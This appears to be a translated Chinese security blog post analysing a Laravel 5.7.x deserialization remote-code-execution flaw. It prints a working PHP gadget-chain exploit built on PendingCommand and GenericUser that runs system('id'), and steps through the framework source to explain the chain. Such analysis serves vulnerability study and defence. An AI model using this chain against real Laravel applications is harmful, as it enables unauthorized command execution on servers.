# Laravel 相关漏洞分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Laravel 5.7.x 反序列化漏洞分析
###  环境搭建
直接github下载对应版本源码，在源码根目录使用`composer install`生成`vender`目录，建议将composer进行换源:
    #阿里云的composer镜像源
    composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
    #腾讯云的composer镜像源
    composer config -g repo.packagist composer https://mirrors.cloud.tencent.com/composer/
Lavarel框架需要使用 **APP_KEY** ,因此还需要将源码中`.env.example`复制后修改 **APP_KEY**
后在生成`.env`文件后
    php artisan key:generate //生成对应APP_KEY
最终环境搭建成功的效果为：
###  反序列化分析
> laravel 5.7是一款基于php 7.1.3之上运行的优秀php开发框架,反序列化RCE漏洞出现在核心包中，但是需要对基于laravel
> v5.7框架进行二次开发的cms出现可控反序列化点，才能触发漏洞实现RCE
将Laravel
5.6和5.7版本进行对比，在`vendor\laravel\framework\src\Illuminate\Foundation\Testing\`下新版本多出了一个文件`PendingCommand.php`：
由于5.7的官方API说明已经无了，只能用5.8的文档进行查看，不过方法和内容是一样的：
整个漏洞也就是从这个文件入手，此处我们选择结合EXP来进行反向分析，通过动态调试的方式来分析反序列化的整个流程,下面先贴EXP：
    command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    namespace{
        $genericuser = new Illuminate\Auth\GenericUser(
            array(
                "expectedOutput"=>array("0"=>"1"),
                "expectedQuestions"=>array("0"=>"1")
                 )
        );
        $application = new Illuminate\Foundation\Application(
            array(
                "Illuminate\Contracts\Console\Kernel"=>
                    array(
                        "concrete"=>"Illuminate\Foundation\Application"
                         )
                 )
        );
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
            "system",array('id'),
            $genericuser,
            $application
        );
        echo urlencode(serialize($pendingcommand));
    }
    ?>
由于需要反序列化的入口，因此我们在`routes\web.php`增加一个路由:
    Route::get('/index','TaskController@index');
新建`app\Http\Controllers\TaskController.php`，并且在此增加反序列化入口：
现在通过exp来动态调试对利用链进行分析:
在执行`unserialize`后需要加载类，这里是通过`src\Illuminate\Foundation\AliasLoader.php`中`load`方法进行类的加载：
`static::$facadeNamespace`是一个字符串常量：`Facades\`  
这里需要了解facade在Laravel框架中的作用
> Facades（读音：/fəˈsäd/ ）为应用程序的服务容器中可用的类提供了一个“静态”接口。Laravel 自带了很多 facades
> ，几乎可以用来访问到 Laravel 中所有的服务。Laravel facades 实际上是服务容器中那些底层类的“静态代理”，相比于传统的静态方法，
> facades 在提供了简洁且丰富的语法同时，还带来了更好的可测试性和扩展性。
关于facade门面的具体用法和实现原理可以参考:
因此总结一下，此时加载`ArrayInput`类和`Mockery`类就会进行如下操作：
1.需要加载的类是否为facede门面类，如果是则调用`$this->loadFacade`  
2.`Illuminate\Support\Facades`命名空间来查找是否属于这些alias
`alias`是类的别名，`class_alias`函数可以为任何类创建别名，而在`Laravel`启动后为各个门面类调用了`class_alias`函数，因此不必直接用类名，在config文件夹的app文件里面存放着门面与类名的映射
Mockery类并非门面类，因此进入后面的if后通过`loadClass`方法调用`findfile()`函数通过classMap中定义的命名空间和对应类的地址的映射来获得所要加载类对应的类文件地址，找到类地址后通过`includeFile`来将该类进行包含：
一直到这Laravel加载类的方式应该也比较清楚了，到此完成了对整个利用类，也就是`PendingCommand`类的加载已经完成  
下面进入该类的析构方法：
`$this->hasExecuted = False`是默认的，因此直接进入`$this->run`方法：
     public function run()
        {
            $this->hasExecuted = true;
            $this->mockConsoleOutput();
            try {
                $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
            } catch (NoMatchingExpectationException $e) {
                if ($e->getMethodName() === 'askQuestion') {
                    $this->test->fail('Unexpected question "'.$e->getActualArguments()[0]->getQuestion().'" was asked.');
                }
                throw $e;
            }
            if ($this->expectedExitCode !== null) {
                $this->test->assertEquals(
                    $this->expectedExitCode, $exitCode,
                    "Expected status code {$this->expectedExitCode} but received {$exitCode}."
                );
            }
            return $exitCode;
        }
使用`Mockery::mock`实现对象的模拟：
这里涉及到类的加载，因此再次会调用load方法来加载类：
因此在这里不在展示加载类的过程，着重放在链的利用上:
接着会调用`$this->createABufferedOutputMock()`方法，我们跟进该方法：
看到这，获取了`$this->test`类中的`expectedOutput`属性，并且为一个数组，如果该属性不为数组，则运行到这就会出错，利用链无法继续,并且经过全局搜索后发现只有测试类拥有该属性:
而测试类一般不会加载，那有何办法能够凭空创造`expectedOutput`属性呢？
没错，魔术方法派上用场了，当类的成员属性被设定为private甚至是没有该成员属性时如果我们去获取这个不存在或者是私有属性，则会触发该类的`__get()`魔术方法  
通过全局搜索找到
    //vendor\laravel\framework\src\Illuminate\Auth\GenericUser.php
    class GenericUser implements UserContract
    {
    public function __construct(array $attributes)
        {
            $this->attributes = $attributes;
        }
    public function __get($key)
        {
            return $this->attributes[$key];
        }
    }
发现在Laravel中还有其他可以利用的类，例如在`\Faker\DefaultGenerator`中:
    class DefaultGenerator
    {
        protected $default;
        public function __construct($default = null)
        {
            $this->default = $default;
        }
        /**
         * @param string $attribute
         *
         * @return mixed
         */
        public function __get($attribute)
        {
            return $this->default;
        }
同样也是可控的，因此也可以选择该类魔术方法，在这里我们使用前者。
通过构造方法我们知道attrubutes属性是我们可控的，这样我们只需要使得`$this->test`为GenericUser类，并且让attributes中存在键名为expectedOutput的数组，这样便可以跳出循环，使得利用链能够继续.  
回到mockConsoleOutput():
发现还存在一次类似情况，获取`$this->test`的expectedQuestions属性，又是只有测试类才有该属性，因此如法炮制再通过该魔术方法遍历得到最终跳出该方法
继续向下就到了利用链的关键处:
    try {
                $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
            } catch (NoMatchingExpectationException $e) {
                if ($e->getMethodName() === 'askQuestion') {
                    $this->test->fail('Unexpected question "'.$e->getActualArguments()[0]->getQuestion().'" was asked.');
                }
                throw $e;
            }
我们来看后面的调用栈：
而`Kernel::class`是一个定量，其值为`Illuminate\Contracts\Console\Kernel`这个类，我们持续跟进后几个调用栈：
在进入make()方法,因为只有一个$key参数，所以第二个参数是空值
再调用父类的make方法，继续跟进，此时`$parameters = []`:
来看一下该方法:
    protected function resolve($abstract, $parameters = [])
        {
            $abstract = $this->getAlias($abstract);
            $needsContextualBuild = ! empty($parameters) || ! is_null(
                $this->getContextualConcrete($abstract)
            );
            // If an instance of the type is currently being managed as a singleton we'll
            // just return an existing instance instead of instantiating new instances
            // so the developer can keep using the same objects instance every time.
            if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
                return $this->instances[$abstract];
            }
            $this->with[] = $parameters;
            $concrete = $this->getConcrete($abstract);
            // We're ready to instantiate an instance of the concrete type registered for
            // the binding. This will instantiate the types, as well as resolve any of
            // its "nested" dependencies recursively until all have gotten resolved.
            if ($this->isBuildable($concrete, $abstract)) {
                $object = $this->build($concrete);
            } else {
                $object = $this->make($concrete);
            }
            // If we defined any extenders for this type, we'll need to spin through them
            // and apply them to the object being built. This allows for the extension
            // of services, such as changing configuration or decorating the object.
            foreach ($this->getExtenders($abstract) as $extender) {
                $object = $extender($object, $this);
            }